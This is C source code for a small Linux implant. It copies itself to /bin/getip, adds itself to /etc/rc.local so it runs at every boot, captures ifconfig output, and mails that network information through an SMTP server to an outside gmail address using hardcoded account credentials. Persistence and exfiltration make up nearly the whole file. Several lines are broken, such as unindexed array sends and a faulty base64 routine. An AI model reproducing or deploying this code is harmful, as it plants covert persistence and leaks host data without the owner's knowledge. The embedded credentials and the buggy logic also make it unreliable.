/*--------------------------------------
code by sink (gymiles@sohu.com)
------------------------------------*/

#include <netinet/in.h>//include socket

#include <sys/socket.h>
#include <stdio.h>//include fopen(),fread().fwrite(),fclose()

#include <stdlib.h>//include system()

#include <netdb.h>//include gethostbyname()


#define PORT 25 //smtp port

#define SIZE 1024 
//define mail commands

#define EHLO 0
#define AUTH 1
#define USER 2
#define PASS 3
#define MAIL 4
#define RCPT 5
#define DATA 6
#define CONT 7
#define QUIT 8

void base64enc(const char *,char *);

int main(int argc,char *argv[])
{
	int sockfd;
	struct sockaddr_in server_addr;
	struct hostent *server_ip;
	int numbytes=0,i=0;
	char username[512]="";//mail username

	char passwd[512]="";//mail passwd


	//buff store data by recv(),

	//ip[SIZE] store data by fread() from ip_files(use "ifconfig >tmp.ip",het ip_files)

	char buff[512]="",tmp[4]="",ip[SIZE]="";
	int ret=0;//function return

	FILE *f_open,*f_write;
	char *msg[9]={""};
	char *n_return[9]={""}; //return number


	msg[EHLO]="ehlo smtp.163.com\n";
	msg[AUTH]="auth login\n";
	base64enc("ttgame1@163.com",username);
	strcat(username,"\n");
	msg[USER]=username;
	base64enc("ttgame11",passwd);
	strcat(passwd,"\n");
	msg[PASS]=passwd;
	msg[MAIL]="mail from:ttgame1@163.com\n";
	msg[RCPT]="rcpt to:andresososo@gmail.com\n";
	msg[DATA]="data\n";
	msg[QUIT]="quit\n";

	n_return[EHLO]="250";
	n_return[AUTH]="334";
	n_return[USER]="334";
	n_return[PASS]="235";
	n_return[MAIL]="250";
	n_return[RCPT]="250";
	n_return[DATA]="354";
	n_return[CONT]="250";


	
	/*---------------------------
copy self to /bin/getip
---------------------------*/
	if(strcmp(argv[0],"/bin/getip")!=0)// if file /bin/getip is not existed,copy to it

	{
		if((f_open=fopen(argv[0],"rb")) ==NULL)//open self

		{
			perror("fopen argv[0] error");
			return(-1);
		}
		
		if((f_write=fopen("/bin/getip","wb")) ==NULL)//open the file which we will write to

		{
			perror("fopen /bin/getip error");
			return(-1);
		} 
		while(fread(tmp,sizeof(tmp),1,f_open)!=0)//read from currect file

		{ 
			if(fwrite(tmp,sizeof(tmp),1,f_write) ==0)//write to /bin/getip

			{
				perror("fwrite error");
				return(-1);
			}
		}
		
		fclose(f_open);//close all files we have opened

		fclose(f_write);

		//chmod 755 /bin/getip

		if((ret=system("chmod 755 /bin/getip"))==-1)
		{
			perror("system error");
			return(-1);
		}

		//call system("echo /bin/getip >>/etc/rc.local") 

		if((ret=system("echo '/bin/getip &' >>/etc/rc.local"))==-1)
		{
			perror("system error");
			return(-1);
		}
	}

	/*---------------------------
get ip,use system() call ifconfig>tmp.ip
---------------------------*/
	if((ret=system("ifconfig >/tmp/tmp.ip"))==-1)
	{
		perror("system error");
		return(-1);
	}
	
	/*-----------------------------
	read from tmp.ip,add it to msg[CONT]
	-----------------------------*/
	if((f_open=fopen("/tmp/tmp.ip","r")) ==NULL)//open /tmp/tmp.ip

	{
		perror("fopen error");
		return(-1);
	}
	

	i=0;
	while((fread(&ip,1,1,f_open)) !=-1)//read from tmp.ip

	{
		i++;
		if(i>SIZE)//if file is large than SIZE,only read SIZE bytes

		break;
	}
	strncat(ip,"\n.\n",3);//cat "\n.\n" to data 

	msg[CONT]=ip; 
	fclose(f_open);


	/*-----------------------------
rm tmp file
------------------------------*/
	if((ret=system("rm -rf /tmp/tmp.ip"))==-1)
	{
		perror("system error");
		return(-1);
	}
	

	/*------------------------------
connect server,and send command
------------------------------*/
	//because the host connect to internet by dail,

	//so,it is possiabe that host have not connected when it start

	//then we sleep 5 miniutes,and try again until the host connect to internet

	//we know the connection status by gethostbyname(),but this way is not always correct

	while((server_ip=gethostbyname("smtp.163.com"))==NULL)
	{
		herror("gethostbyname error");
		sleep(300);
	}
	//create a socket

	if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1)
	{
		perror("socket error");
		return(-1);
	}
	//address information

	server_addr.sin_family=AF_INET;//host byte order

	server_addr.sin_port=htons(PORT);//short,network byte order

	server_addr.sin_addr=*((struct in_addr *)server_ip->h_addr);//server ip

	bzero(&(server_addr.sin_zero),8);//zero the rest of struct

	//connect server

	if(connect(sockfd,(struct sockaddr *)&server_addr,sizeof(struct sockaddr))==-1)
	{
		perror("connect error");
		return(-1);
	}
	//if connect success,server return "220"

	if((numbytes=recv(sockfd,buff,SIZE,0))==-1)
	{
		perror("recv error");
		return(-1);
	} 
	//clean tmp

	for(i=0;i<4;i++)
	tmp[i]='\0';
	strncpy(tmp,buff,3);
	if(strcmp(tmp,"220")!=0)
	return (-1);
	
	//send msgs. if any step has a mistake,the "while" will be breaked,then send "quit" to end connection 

	i=EHLO;
	while(i<QUIT)
	{
		if((numbytes=send(sockfd,msg,strlen(msg),0))==-1)
		{
			perror("send error");
			break;
		}
		//sleep(1);we dont have to use it,because recv() can choke itself until it received data

		if((numbytes=recv(sockfd,buff,SIZE,0))==-1)
		{
			perror("recv error");
			break;
		} 
		strncpy(tmp,buff,3);
		
		//printf("command:%s\n",msg);

		//printf("return buff:%s\n",buff);

		//printf("should return:%s\n",n_return);

		
		if(strcmp(tmp,n_return)==0) 
		i++;
		else
		break;
		
	}


	//send quit to end mail connection

	if((numbytes=send(sockfd,msg[QUIT],strlen(msg[QUIT]),0))==-1)
	{
		perror("send error");
		return(-1);
	}


	close(sockfd);
	return (0);
}

/*-------------------------
base64 encode function
-------------------------*/
void base64enc(const char *instr,char *outstr)
{ 
	char * table="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	int instr_len=0,i=0,j=0,pad=0; 
	unsigned char buf1[4]="",buf2[4]=""; 

	instr_len=strlen(instr);
	pad=instr_len%3;
	for(i=0;i<instr_len;i+=3) 
	{ 
		if(i==instr_len-pad)
		strncpy(buf1,&instr,pad);
		else
		strncpy(buf1,&instr,3);

		buf2[0] = buf1[0] >> 2; 
		buf2[1] = (buf1[0] & 0x03) << 4 | buf1[1] >> 4; 
		buf2[2] = (buf1[1] & 0x0f) << 2 | buf1[2] >> 6; 
		buf2[3] = buf1[2] & 0x3f; 
		for(j=0;j<4;j++) 
		buf2[j]=table[buf2[j]];
		
		if(i==instr_len-pad)
		for(j=3;j>pad;j--)
		buf2[j]='=';
		
		strncat(outstr,buf2,4);
	}

} 
